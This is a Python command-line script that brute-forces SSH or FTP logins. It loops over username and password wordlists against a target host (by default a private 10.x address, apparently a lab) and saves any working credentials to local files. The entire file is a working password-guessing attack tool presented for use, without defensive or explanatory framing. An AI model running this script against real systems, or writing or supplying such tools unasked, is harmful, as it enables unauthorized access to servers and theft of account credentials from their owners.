import ftplib
import paramiko
import argparse
import socket


def ssh_brute_force(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=ip, port=port, username=user, password=passwd, timeout=3)
    except paramiko.AuthenticationException:
        print(f"Authentication failed - {user}:{passwd}")
    except socket.timeout:
        print("Timeout error")
    except paramiko.SSHException:
        print("SSH connection error")
    else:
        print(f"Password found: {user}:{passwd}")
        with open("../ssh_found", 'a') as f_found:
            f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
            f_found.flush()
    finally:
        try:
            client.close()
        except:
            pass

def ftp_brute_force(ip, port, user, passwd):
    server = ftplib.FTP()
    print(f"Trying : {user}:{passwd}",flush=True)
    try:
        server.connect(ip, port, timeout=5)
        server.login(user, passwd)

    except ftplib.error_perm:
        print("Authentication failed")
    except socket.timeout:
        print("Timeout error")
    except ConnectionRefusedError:
        print("Connection refused")
    else:
        print(f"Password found: {user}:{passwd}")
        with open("ftp_found", 'a') as f_found:
            f_found.write(f"{ip}:{port} - {user}:{passwd}\n")
            f_found.flush()
    finally:
        try:
            server.close()
        except Exception as e:
            print(f"Unexpected error: {type(e).__name__}: {e}")

if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser()

    arg_parser.add_argument("-f", "--filepath", help="path to the pass list")
    arg_parser.add_argument("-t", "--target", help="target ip")
    arg_parser.add_argument("-p", "--protocol", help="protocol to use for the attack", required=True)
    args = arg_parser.parse_args()

    userlist = "attacks/utilities/userlist.txt"
    passlist = "attacks/utilities/password.txt"
    target = "10.12.0.10"

    if args.filepath:
        passlist = args.filepath

    if args.target:
        target = args.target
    

    print(f"Targetting {target} with {args.protocol}")

    with open(userlist, 'r') as user_list:
        for u_line in user_list:
            username = u_line.strip()
            with open(passlist, 'r') as f:
                for p_line in f:
                    password = p_line.strip()

                    if args.protocol == "ssh":
                        ssh_brute_force(ip=target, port=22, user=username, passwd=password)
                    elif args.protocol == "ftp":
                        ftp_brute_force(ip=target, port=21, user=username, passwd=password)

                    else:
                        print(f"Unknown protocol: '{args.protocol}'", flush=True)




    print(f"protocol='{args.protocol}' target='{args.target}'", flush=True)










